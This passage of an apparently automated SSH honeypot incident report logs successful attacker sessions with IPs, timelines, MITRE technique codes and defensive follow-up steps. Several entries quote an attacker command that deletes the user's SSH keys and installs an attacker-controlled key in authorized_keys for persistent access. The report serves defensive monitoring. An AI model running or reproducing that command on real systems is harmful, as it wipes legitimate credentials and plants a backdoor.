- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abfe4ce642e3

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-27 07:17 |
| **Last Seen** | 2026-05-27 07:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 07:17:08` | `cowrie.session.connect` |
| `2026-05-27 07:17:08` | `cowrie.client.version` |
| `2026-05-27 07:17:08` | `cowrie.client.kex` |
| `2026-05-27 07:17:09` | `cowrie.login.success` |
| `2026-05-27 07:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a763b72a2e0

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-27 07:18 |
| **Last Seen** | 2026-05-27 07:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 07:18:37` | `cowrie.session.connect` |
| `2026-05-27 07:18:37` | `cowrie.client.version` |
| `2026-05-27 07:18:38` | `cowrie.client.kex` |
| `2026-05-27 07:18:39` | `cowrie.login.success` |
| `2026-05-27 07:18:40` | `cowrie.session.params` |
| `2026-05-27 07:18:40` | `cowrie.command.input` |
| `2026-05-27 07:18:40` | `cowrie.command.failed` |
| `2026-05-27 07:18:40` | `cowrie.log.closed` |
| `2026-05-27 07:18:41` | `cowrie.session.params` |
| `2026-05-27 07:18:41` | `cowrie.command.input` |
| `2026-05-27 07:18:41` | `cowrie.session.file_download` |
| `2026-05-27 07:18:41` | `cowrie.log.closed` |
| `2026-05-27 07:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbcf25365611

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-27 07:18 |
| **Last Seen** | 2026-05-27 07:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 07:18:45` | `cowrie.session.connect` |
| `2026-05-27 07:18:45` | `cowrie.client.version` |
| `2026-05-27 07:18:45` | `cowrie.client.kex` |
| `2026-05-27 07:18:46` | `cowrie.login.success` |
| `2026-05-27 07:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d76e84ca81

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-27 07:22 |
| **Last Seen** | 2026-05-27 07:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 07:22:01` | `cowrie.session.connect` |
| `2026-05-27 07:22:01` | `cowrie.client.version` |
| `2026-05-27 07:22:01` | `cowrie.client.kex` |
| `2026-05-27 07:22:02` | `cowrie.login.success` |
| `2026-05-27 07:22:03` | `cowrie.session.params` |
| `2026-05-27 07:22:03` | `cowrie.command.input` |
| `2026-05-27 07:22:03` | `cowrie.command.failed` |
| `2026-05-27 07:22:04` | `cowrie.log.closed` |
| `2026-05-27 07:22:04` | `cowrie.session.params` |
| `2026-05-27 07:22:04` | `cowrie.command.input` |
| `2026-05-27 07:22:04` | `cowrie.session.file_download` |
| `2026-05-27 07:22:04` | `cowrie.log.closed` |
| `2026-05-27 07:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70da27b409c

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-27 07:22 |
| **Last Seen** | 2026-05-27 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 07:22:08` | `cowrie.session.connect` |
| `2026-05-27 07:22:08` | `cowrie.client.version` |
| `2026-05-27 07:22:08` | `cowrie.client.kex` |
| `2026-05-27 07:22:10` | `cowrie.login.success` |
| `2026-05-27 07:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55fb439ba232

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-27 07:23 |
| **Last Seen** | 2026-05-27 07:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 07:23:45` | `cowrie.session.connect` |
| `2026-05-27 07:23:45` | `cowrie.client.version` |
| `2026-05-27 07:23:46` | `cowrie.client.kex` |
| `2026-05-27 07:23:47` | `cowrie.login.success` |
| `2026-05-27 07:23:48` | `cowrie.session.params` |
| `2026-05-27 07:23:48` | `cowrie.command.input` |
| `2026-05-27 07:23:48` | `cowrie.command.failed` |
| `2026-05-27 07:23:48` | `cowrie.log.closed` |
| `2026-05-27 07:23:49` | `cowrie.session.params` |
| `2026-05-27 07:23:49` | `cowrie.command.input` |
| `2026-05-27 07:23:49` | `cowrie.session.file_download` |
| `2026-05-27 07:23:49` | `cowrie.log.closed` |
| `2026-05-27 07:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e0ce35e0ff

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-27 07:23 |
| **Last Seen** | 2026-05-27 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 07:23:53` | `cowrie.session.connect` |
| `2026-05-27 07:23:53` | `cowrie.client.version` |
| `2026-05-27 07:23:53` | `cowrie.client.kex` |
| `2026-05-27 07:23:54` | `cowrie.login.success` |
| `2026-05-27 07:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1592ba025041

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-27 07:27 |
| **Last Seen** | 2026-05-27 07:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 07:27:18` | `cowrie.session.connect` |
| `2026-05-27 07:27:18` | `cowrie.client.version` |
| `2026-05-27 07:27:18` | `cowrie.client.kex` |
| `2026-05-27 07:27:20` | `cowrie.login.success` |
| `2026-05-27 07:27:20` | `cowrie.session.params` |
| `2026-05-27 07:27:20` | `cowrie.command.input` |
| `2026-05-27 07:27:20` | `cowrie.command.failed` |
| `2026-05-27 07:27:21` | `cowrie.log.closed` |
| `2026-05-27 07:27:22` | `cowrie.session.params` |
| `2026-05-27 07:27:22` | `cowrie.command.input` |
| `2026-05-27 07:27:22` | `cowrie.session.file_download` |
| `2026-05-27 07:27:22` | `cowrie.log.closed` |
| `2026-05-27 07:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f06e8fa22d62

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-27 07:27 |
| **Last Seen** | 2026-05-27 07:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 07:27:25` | `cowrie.session.connect` |
| `2026-05-27 07:27:25` | `cowrie.client.version` |
| `2026-05-27 07:27:26` | `cowrie.client.kex` |
| `2026-05-27 07:27:27` | `cowrie.login.success` |
| `2026-05-27 07:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-493c2b8f1b0b

| Field | Detail |
|---|---|
| **Source IP** | `124.239.153[.]90` |
| **First Seen** | 2026-05-27 08:23 |
| **Last Seen** | 2026-05-27 08:28 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 08:23:17` | `cowrie.session.connect` |
| `2026-05-27 08:23:17` | `cowrie.client.version` |
| `2026-05-27 08:23:17` | `cowrie.client.kex` |
| `2026-05-27 08:23:17` | `cowrie.login.success` |
| `2026-05-27 08:28:17` | `cowrie.session.file_upload` |
| `2026-05-27 08:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.153[.]90` to AbuseIPDB if not already reported
- [ ] Block `124.239.153[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-860af5f4500c

| Field | Detail |
|---|---|
| **Source IP** | `172.191.94[.]172` |
| **First Seen** | 2026-05-27 08:54 |
| **Last Seen** | 2026-05-27 08:54 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 08:54:09` | `cowrie.session.connect` |
| `2026-05-27 08:54:09` | `cowrie.client.version` |
| `2026-05-27 08:54:10` | `cowrie.client.kex` |
| `2026-05-27 08:54:23` | `cowrie.login.success` |
| `2026-05-27 08:54:24` | `cowrie.session.params` |
| `2026-05-27 08:54:24` | `cowrie.command.input` |
| `2026-05-27 08:54:24` | `cowrie.command.failed` |
| `2026-05-27 08:54:25` | `cowrie.log.closed` |
| `2026-05-27 08:54:30` | `cowrie.session.params` |
| `2026-05-27 08:54:30` | `cowrie.command.input` |
| `2026-05-27 08:54:40` | `cowrie.session.file_download` |
| `2026-05-27 08:54:40` | `cowrie.log.closed` |
| `2026-05-27 08:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.94[.]172` to AbuseIPDB if not already reported
- [ ] Block `172.191.94[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d2e56471664

| Field | Detail |
|---|---|
| **Source IP** | `172.191.94[.]172` |
| **First Seen** | 2026-05-27 08:54 |
| **Last Seen** | 2026-05-27 08:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 08:54:54` | `cowrie.session.connect` |
| `2026-05-27 08:54:54` | `cowrie.client.version` |
| `2026-05-27 08:54:54` | `cowrie.client.kex` |
| `2026-05-27 08:54:56` | `cowrie.login.success` |
| `2026-05-27 08:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.94[.]172` to AbuseIPDB if not already reported
- [ ] Block `172.191.94[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8d6faa52568

| Field | Detail |
|---|---|
| **Source IP** | `172.191.94[.]172` |
| **First Seen** | 2026-05-27 09:01 |
| **Last Seen** | 2026-05-27 09:02 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:01:26` | `cowrie.session.connect` |
| `2026-05-27 09:01:26` | `cowrie.client.version` |
| `2026-05-27 09:01:30` | `cowrie.client.kex` |
| `2026-05-27 09:01:39` | `cowrie.login.success` |
| `2026-05-27 09:01:41` | `cowrie.session.params` |
| `2026-05-27 09:01:41` | `cowrie.command.input` |
| `2026-05-27 09:01:41` | `cowrie.command.failed` |
| `2026-05-27 09:01:41` | `cowrie.log.closed` |
| `2026-05-27 09:01:42` | `cowrie.session.params` |
| `2026-05-27 09:01:42` | `cowrie.command.input` |
| `2026-05-27 09:01:43` | `cowrie.session.file_download` |
| `2026-05-27 09:01:43` | `cowrie.log.closed` |
| `2026-05-27 09:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.94[.]172` to AbuseIPDB if not already reported
- [ ] Block `172.191.94[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e24832eeffc1

| Field | Detail |
|---|---|
| **Source IP** | `172.191.94[.]172` |
| **First Seen** | 2026-05-27 09:01 |
| **Last Seen** | 2026-05-27 09:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:01:54` | `cowrie.session.connect` |
| `2026-05-27 09:01:55` | `cowrie.client.version` |
| `2026-05-27 09:01:57` | `cowrie.client.kex` |
| `2026-05-27 09:02:00` | `cowrie.login.success` |
| `2026-05-27 09:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.94[.]172` to AbuseIPDB if not already reported
- [ ] Block `172.191.94[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d2aeedd5e95

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]170` |
| **First Seen** | 2026-05-27 09:06 |
| **Last Seen** | 2026-05-27 09:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:06:13` | `cowrie.session.connect` |
| `2026-05-27 09:06:13` | `cowrie.client.version` |
| `2026-05-27 09:06:13` | `cowrie.client.kex` |
| `2026-05-27 09:06:14` | `cowrie.login.success` |
| `2026-05-27 09:06:14` | `cowrie.session.params` |
| `2026-05-27 09:06:14` | `cowrie.command.input` |
| `2026-05-27 09:06:14` | `cowrie.command.failed` |
| `2026-05-27 09:06:14` | `cowrie.log.closed` |
| `2026-05-27 09:06:14` | `cowrie.session.params` |
| `2026-05-27 09:06:14` | `cowrie.command.input` |
| `2026-05-27 09:06:14` | `cowrie.session.file_download` |
| `2026-05-27 09:06:14` | `cowrie.log.closed` |
| `2026-05-27 09:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]170` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc34fc9993b

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]170` |
| **First Seen** | 2026-05-27 09:06 |
| **Last Seen** | 2026-05-27 09:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:06:16` | `cowrie.session.connect` |
| `2026-05-27 09:06:16` | `cowrie.client.version` |
| `2026-05-27 09:06:16` | `cowrie.client.kex` |
| `2026-05-27 09:06:16` | `cowrie.login.success` |
| `2026-05-27 09:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]170` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f07c25d6856

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]89` |
| **First Seen** | 2026-05-27 09:11 |
| **Last Seen** | 2026-05-27 09:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:11:11` | `cowrie.session.connect` |
| `2026-05-27 09:11:11` | `cowrie.client.version` |
| `2026-05-27 09:11:11` | `cowrie.client.kex` |
| `2026-05-27 09:11:12` | `cowrie.login.success` |
| `2026-05-27 09:11:12` | `cowrie.session.params` |
| `2026-05-27 09:11:12` | `cowrie.command.input` |
| `2026-05-27 09:11:12` | `cowrie.command.failed` |
| `2026-05-27 09:11:13` | `cowrie.log.closed` |
| `2026-05-27 09:11:13` | `cowrie.session.params` |
| `2026-05-27 09:11:13` | `cowrie.command.input` |
| `2026-05-27 09:11:13` | `cowrie.session.file_download` |
| `2026-05-27 09:11:13` | `cowrie.log.closed` |
| `2026-05-27 09:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]89` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52a75fefbd37

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]89` |
| **First Seen** | 2026-05-27 09:11 |
| **Last Seen** | 2026-05-27 09:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:11:16` | `cowrie.session.connect` |
| `2026-05-27 09:11:16` | `cowrie.client.version` |
| `2026-05-27 09:11:16` | `cowrie.client.kex` |
